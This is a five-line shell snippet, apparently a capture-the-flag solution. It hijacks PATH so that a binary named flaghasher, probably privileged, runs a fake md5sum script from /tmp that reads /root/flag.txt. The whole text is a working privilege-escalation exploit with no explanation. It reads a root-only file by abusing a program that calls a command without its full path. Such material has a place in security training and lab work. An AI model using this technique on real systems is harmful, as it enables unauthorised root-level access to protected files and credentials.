echo '#!/bin/bash' > /tmp/md5sum
echo 'cat /root/flag.txt' >> /tmp/md5sum
chmod +x /tmp/md5sum
export PATH="/tmp:$PATH"
/usr/local/bin/flaghasher 